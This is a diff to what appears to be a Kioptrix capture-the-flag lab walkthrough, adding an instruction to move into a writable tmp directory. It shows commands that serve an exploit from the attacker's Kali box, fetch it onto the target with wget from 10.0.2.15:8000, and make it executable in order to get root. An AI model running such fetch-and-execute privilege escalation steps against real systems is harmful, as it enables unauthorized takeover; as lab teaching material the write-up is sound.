@@ -178,7 +178,11 @@ Now have have to figure out how to get it onto the Kioptrix box.
 On the Kali box, we want to run to open a temporary HTTP server, so we can transfer the files across to the Kioptrix server.
 ```$ python -m SimpleHTTPServer```
 
-Now that we have a server set-up, we go back over to the Kioptrix terminal and chuck in the following commands, which should get up access to root!
+Now that we have a server set-up, we go back over to the Kioptrix terminal. First we need to get into a directory in which Apache can write and execute in, this can be achived by going to 
+``` 
+$ cd tmp
+```
+Once in TMP we can chuck in the following commands, which should get us access to root!
 ```
 $ wget 10.0.2.15:8000/9542
 $ chmod +x 9542
